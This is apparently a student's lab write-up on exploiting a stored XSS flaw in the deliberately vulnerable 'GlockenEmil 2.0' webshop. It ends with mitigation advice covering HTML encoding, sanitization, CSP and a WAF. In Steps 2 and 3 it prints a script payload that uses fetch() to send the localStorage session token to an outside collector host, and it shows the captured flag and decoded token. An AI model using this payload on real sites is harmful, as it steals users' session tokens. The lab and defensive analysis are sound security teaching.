# GlockenEmil 2.0 XSS

## Steps (on my own)

### Step 1 Randomly trying to find XSS vulnerability
Trying to find XSS vulnerabilities with the following script: `<script>alert('hacked')</script>`

- Details > Questions:  not vulnerable (at least with this script)
- Product > Rate: vulnerable, script is executed

(after that I restarted the docker as the alter messages became a bit annyoing)


### Step 2 Try to find how the token is stored
Using developer tools, I find a token stored in "Local storage"  (not in the cookies, not in the session storage, might also be stored somewhere in a javascript variable but didnt look too much there). I wonder if localStorage is the right place for a session token. 

From this I can prepare a script that sends the token: 
`<script type='text/javascript'>fetch('https://myevilsomethingSite/?ttttttt='+encodeURIComponent(localStorage.getItem('token')));</script>
`

### Step 3 Exploit
I use the prepared script to exploit the found XSS vulnerability. (Post the script in the rating site). From now on, every user browsing on that particular rating site will execute the script which will send the token to my evil site. 


<script type='text/javascript'>fetch('https://8bc3385e-a2db-4bdb-b177-0ebfc8d49dce.idocker.vuln.land/?ttttttt='+encodeURIComponent(localStorage.getItem('token')));</script>

Due to CORS not enabled by the request capture site, the GlockenEmil site cannot read the content of 'my' evil request, but from the point of view of the attacker, this doesn't matter as it is still being sent. 


*Remark: from then on, i basically followed the steps described in the task. (wordk a bit better)*

### Step 4 Collecting information 
Informatoin retrieved using this XSS attack for customer0: 

Flag: "3cb593a3-4bc4-4c8e-a11c-c2948ad2ee85"

Token (decoded with the help of JWT site: https://jwt.io/ )
```

{
  "isRetailer": false,
  "_id": "5aa0481e876d9d39d4397859",
  "username": "customer0",
  "firstname": "Juliane",
  "lastname": "Schulze",
  "email": "Juliane.Schulze@gmail.com",
  "iat": 1677868251,
  "aud": "self",
  "iss": "webshop"
}
````


## Security questions


- What is the problem with the vulnerable web shop ?
    - The user input is executed, which should never happen. The (stored) user input that has to be HTML encoded when it is rendered (server + client side) onto the page.
- What is the purpose of the request catcher service?
    - it basically logs ever request to it on the debug site. Here the capture service acts as the evil site, that collects information that is "stolen" from the GlockenEmil service via XSS exploit.  
- How would you mitigate that risk?
    - The following steps can be taken to either eliminate or mitigate the risk: 
        1. HTML encode the user input (this alone would be the solution and eliminate the risk, at least for input rendered into html. HTML encoding has to be implemented accross the entire application and requires descipline and knowledge among the developers)
        2. Sanitize user input
            - user input can be searched for suspicous content (e.g. script tags) and either be requejected or the content being removed. However, there can be false positives. For a site like glockenEmail I would probably not sanitize the input, but rather ensure HTML encoding. (I would probably sanitize in cases when user can enter formated data with an editor that needs to be displayed formatted again. )
        3. Content Security Policy (CSP)
            CSP can reduce or even eliminate XSS vulnerabilities. If inline scripts are not allowed via CSP, this particular attack would not be possible. 
        4. WAF Web application firewall
            - A WAF can scan and reject (or sanizite) suspicious requests. (will it catch all cases? ... and are there false positives??)
